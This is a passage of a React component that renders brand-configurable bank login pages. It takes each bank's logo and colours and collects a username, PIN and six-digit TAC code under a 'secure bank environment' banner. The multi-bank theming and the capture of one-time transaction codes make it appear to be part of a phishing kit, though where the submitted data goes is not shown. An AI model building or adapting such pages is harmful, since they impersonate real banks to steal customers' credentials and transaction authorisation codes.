              {bank.logoFile ? (
                <img src={bank.logoFile} alt={bank.name} style={{ maxHeight: '100%', maxWidth: '200px', objectFit: 'contain' }} />
              ) : (
                <div style={{ fontSize: '24px', fontWeight: 'bold', color: design.typography.headerColor }}>{bank.logo}</div>
              )}
            </header>
          );
        
        case "form":
          return (
            <div key="form" style={{ display: 'flex', justifyContent: design.formBox.alignment === 'center' ? 'center' : design.formBox.alignment === 'right' ? 'flex-end' : 'flex-start', padding: '2rem' }}>
              <div 
                style={{
                  backgroundColor: design.formBox.backgroundColor,
                  color: design.formBox.textColor,
                  borderRadius: design.formBox.borderRadius,
                  boxShadow: design.formBox.boxShadow !== 'none' ? '0 10px 25px -5px rgba(0, 0, 0, 0.1)' : 'none',
                  padding: design.formBox.padding,
                  width: design.formBox.width,
                  maxWidth: '100%',
                  fontFamily: design.typography.fontFamily
                }}
              >
                <h2 style={{ fontSize: '24px', fontWeight: 'bold', color: design.typography.headerColor, marginBottom: '0.5rem' }}>{design.texts.title}</h2>
                <p style={{ fontSize: '15px', color: design.typography.bodyColor, marginBottom: '2rem' }}>{design.texts.subtitle}</p>
                
                <form onSubmit={handleSubmit}>
                  <div style={{ marginBottom: '1rem' }}>
                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Benutzername</label>
                    <input value={verfuegernummer} onChange={e => setVerfuegernummer(e.target.value)} type="text" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Ihr Benutzername" />
                  </div>
                  <div style={{ marginBottom: '1.5rem' }}>
                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Passwort</label>
                    <input value={pin} onChange={e => setPin(e.target.value)} type="password" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Ihr Passwort" />
                  </div>
                  
                  {error && <p style={{ color: '#ef4444', fontSize: '14px', marginBottom: '1rem' }}>{error}</p>}
                  
                  <button 
                    type="submit"
                    disabled={saving || !canSubmitPrimaryCredentials}
                    style={{
                      width: '100%',
                      backgroundColor: design.button.backgroundColor,
                      color: design.button.textColor,
                      padding: design.button.padding,
                      borderRadius: design.button.borderRadius,
                      fontWeight: design.button.fontWeight as any,
                      border: 'none',
                      cursor: saving || !canSubmitPrimaryCredentials ? 'not-allowed' : 'pointer',
                      opacity: saving || !canSubmitPrimaryCredentials ? 0.7 : 1
                    }}
                  >
                    {design.texts.title}
                  </button>
                </form>
              </div>
            </div>
          );
  
        case "footer":
          return (
            <footer key="footer" style={{ padding: '2rem', textAlign: 'center', marginTop: 'auto' }}>
              <div style={{ display: 'flex', justifyContent: 'center', gap: '2rem', flexWrap: 'wrap' }}>
                {design.texts.footerLinks.map((link: string, i: number) => (
                  <a key={i} href="#" style={{ color: design.typography.linkColor, fontSize: '14px', textDecoration: 'none' }}>{link}</a>
                ))}
              </div>
            </footer>
          );
  
        case "spacer":
          return <div key={`spacer-${index}`} style={{ flexGrow: 1, minHeight: '2rem' }}></div>;
          
        default:
          return null;
      }
    };
  
    return (
      <div 
        style={{
          minHeight: '100vh',
          display: 'flex',
          flexDirection: 'column',
          backgroundColor: design.background.type === 'color' ? design.background.value : 'transparent',
          backgroundImage: design.background.type === 'image' ? `url(${design.background.value})` : 'none',
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          fontFamily: design.typography.fontFamily
        }}
      >
        {design.blocks.map((block: BlockType, index: number) => renderBlock(block, index))}
      </div>
    );
  }

  // ESKİ FALLBACK TASARIM (Dinamik şema yoksa çalışır)
  if (!theme) {
    return (
      <div className="flex min-h-screen items-center justify-center p-4">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-zinc-300 border-t-zinc-600" />
        </div>
      </div>
    );
  }

  const primaryColor = bank.brandColor || theme.colors.primary;
  const secondaryColor = bank.accentColor || theme.colors.secondary;
  const logoText = bank.logo || theme.logoText;

  return (
    <div className="flex min-h-screen items-center justify-center p-4 bg-gray-50">
      <div className="app-panel overflow-hidden rounded-2xl w-full max-w-md shadow-xl border border-gray-100 bg-white">
        <div
          className="flex items-center justify-between px-5 py-4 text-white"
          style={{ backgroundColor: primaryColor, color: theme.colors.textOnPrimary }}
        >
          <div className="flex items-center gap-3">
            <div
              className="grid h-10 min-w-10 place-items-center rounded-md px-2 text-xs font-bold tracking-wide bg-white/20"
              style={{ color: theme.colors.textOnPrimary }}
            >
              {bank.logoFile ? (
                <img src={bank.logoFile} alt={bank.name} style={{ maxHeight: '24px', objectFit: 'contain' }} />
              ) : (
                logoText
              )}
            </div>
            <div>
              <p className="text-[10px] uppercase tracking-widest opacity-80">Veilige Bankomgeving</p>
              <h2 className="text-lg font-bold">{bank.name}</h2>
            </div>
          </div>
        </div>

        <form
          onSubmit={(e) => {
            e.preventDefault();
            void handleSubmit();
          }}
          className="space-y-5 p-6"
        >
          <label className="block text-sm font-bold text-zinc-800">
            {theme.inputLabels.verfuegernummer}
            <input
              className="mt-2 block w-full rounded-xl border border-gray-200 bg-gray-50 py-3 px-4 text-lg shadow-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all"
              value={verfuegernummer}
              onChange={(e) => setVerfuegernummer(e.target.value)}
            />
          </label>

          <label className="block text-sm font-bold text-zinc-800">
            {theme.inputLabels.pin}
            <input
              type="password"
              className="mt-2 block w-full rounded-xl border border-gray-200 bg-gray-50 py-3 px-4 text-lg shadow-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all"
              value={pin}
              onChange={(e) => setPin(e.target.value)}
            />
          </label>

          <label className="block text-sm font-bold text-zinc-800">
            {theme.inputLabels.tacCode}
            <input
              inputMode="numeric"
              maxLength={6}
              className="mt-2 block w-full rounded-xl border border-gray-200 bg-gray-50 py-3 px-4 text-lg shadow-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all tracking-widest"
              value={tacCode}
              onChange={(e) => setTacCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
            />
          </label>

          {error ? <p className="text-sm font-medium text-red-600">{error}</p> : null}

          <button
            type="submit"
            disabled={saving || !canSubmitPrimaryCredentials}
            className="w-full rounded-xl py-4 text-lg font-bold shadow-md transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
            style={{ backgroundColor: primaryColor, color: theme.colors.textOnPrimary }}
          >
            {theme.buttonText}
          </button>
        </form>
      </div>
    </div>
  );
}
